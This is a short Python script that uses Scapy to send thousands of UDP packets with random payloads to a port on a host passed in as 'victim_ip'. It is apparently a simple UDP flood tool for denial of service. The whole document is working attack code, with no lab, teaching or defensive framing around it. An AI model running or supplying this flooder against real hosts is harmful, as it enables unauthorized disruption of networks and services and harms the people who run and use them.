from scapy.all import IP, UDP, Raw, send, conf
import argparse, os

ap = argparse.ArgumentParser()
ap.add_argument("victim_ip")
ap.add_argument("-p", "--port", type=int, default=50505)
ap.add_argument("-c", "--count", type=int, default=10_000)
ap.add_argument("-i", "--iface", default=None,
                help="TX interface (defaults to Scapy's conf.iface)")
args = ap.parse_args()

if args.iface:
    conf.iface = args.iface

payload = os.urandom(64)
pkt = IP(dst=args.victim_ip)/UDP(dport=args.port)/Raw(load=payload)
print(f"[*] Blasting {args.count} UDP packets on {conf.iface}")
for _ in range(args.count):
    send(pkt, verbose=False)